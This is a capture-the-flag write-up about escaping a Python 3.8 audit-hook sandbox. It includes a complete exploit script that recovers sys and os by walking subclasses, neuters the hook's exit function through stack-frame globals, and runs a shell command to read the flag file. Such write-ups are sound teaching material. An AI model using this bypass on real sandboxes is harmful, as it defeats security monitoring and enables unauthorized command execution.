# audited - _pwn, 263pts_

For this challenge we had to bypass runtime audit hooks in the Python interpreter, which were a new addition in Python 3.8. In a nutshell, audit hooks allow scripts to add a hook which is called whenever any interesting event occurs. These events cover things like creating new code objects, opening files, and execveing. You can find a comprehensive list of all audit events in the [CPython documentation](https://docs.python.org/3/library/audit_events.html), and for more implementation details see the [PEP publication](https://www.python.org/dev/peps/pep-0578/).

The challenge registered an audit hook which would call `__exit` (their imported alias of `os._exit`) if it was triggered, which meant that we couldn't simply open the flag or spawn a shell, for example.

Initially I thought this might be a 1-day challenge, so I trawled through all of the audit-hook-related entries in the Python bugtracker, and all issues/PRs on GitHub, but I didn't spot any obvious bugs which would help us solve the challenge. So this was either a previously-unknown bug in the audit implementation, or the developers had forgotten to add audit hooks for some useful function (seemed unlikely as they were pretty diligent in adding them, based on the commit history), or we had to attack the registered audit function itself.

Eventually I decided that the latter option seemed like the most likely, and it became clear that if we could get a reference to the `__main__` module, then we could overwrite the `__exit` function reference with some no-op function, to stop the audit hook from actually exiting the script. 

I was able to achieve this by raising an exception and walking up the stack frames until I found the frame containing the reference to `__exit`. Once I had that I  overwrote it with `print`, and then used `os.system` to cat the flag.
```python
classes = ''.__class__.__base__.__subclasses__()
sys = classes[133].__init__.__globals__['sys']
os = classes[94].__init__.__globals__['_os']

try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if 'audit' in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals['__exit'] = print

    # Now we're free to call whatever we want
    os.system('cat /flag*')
```

